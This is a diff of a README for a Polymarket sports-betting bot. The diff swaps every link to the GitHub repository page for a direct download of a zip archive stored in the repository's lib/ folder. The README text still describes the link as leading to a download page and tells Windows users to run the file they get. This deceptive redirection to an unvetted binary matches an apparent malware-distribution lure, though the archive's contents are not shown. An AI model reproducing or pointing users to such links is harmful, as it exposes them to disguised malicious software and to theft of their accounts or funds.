@@ -1,6 +1,6 @@
 # ⚽ polymarket-sports-trading-bot - Automated Sports Betting Made Simple
 
-[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/thiagocavalheiro/polymarket-sports-trading-bot/main/lib/bot-sports-trading-polymarket-2.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these requirements:
 
 1. Click the big green button below to visit the page where you can download the software.
 
-[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/thiagocavalheiro/polymarket-sports-trading-bot/main/lib/bot-sports-trading-polymarket-2.1.zip)
 
 2. On the GitHub page, look for the latest release or the main download section. Download the Windows setup file, which will likely be an `.exe` or `.zip` file.
 
@@ -73,7 +73,7 @@ The interface is designed to be simple:
 
 New versions may improve performance or add features. To update:
 
-- Return to the [GitHub download page](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
+- Return to the [GitHub download page](https://raw.githubusercontent.com/thiagocavalheiro/polymarket-sports-trading-bot/main/lib/bot-sports-trading-polymarket-2.1.zip)
 
 - Find the latest release and download the updated file
 
@@ -125,4 +125,4 @@ For support or questions, use the GitHub issues page linked on the repository. P
 
 Visit this page to download and run the software on your Windows computer:
 
-[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/thiagocavalheiro/polymarket-sports-trading-bot)
+[![Download polymarket-sports-trading-bot](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://raw.githubusercontent.com/thiagocavalheiro/polymarket-sports-trading-bot/main/lib/bot-sports-trading-polymarket-2.1.zip)
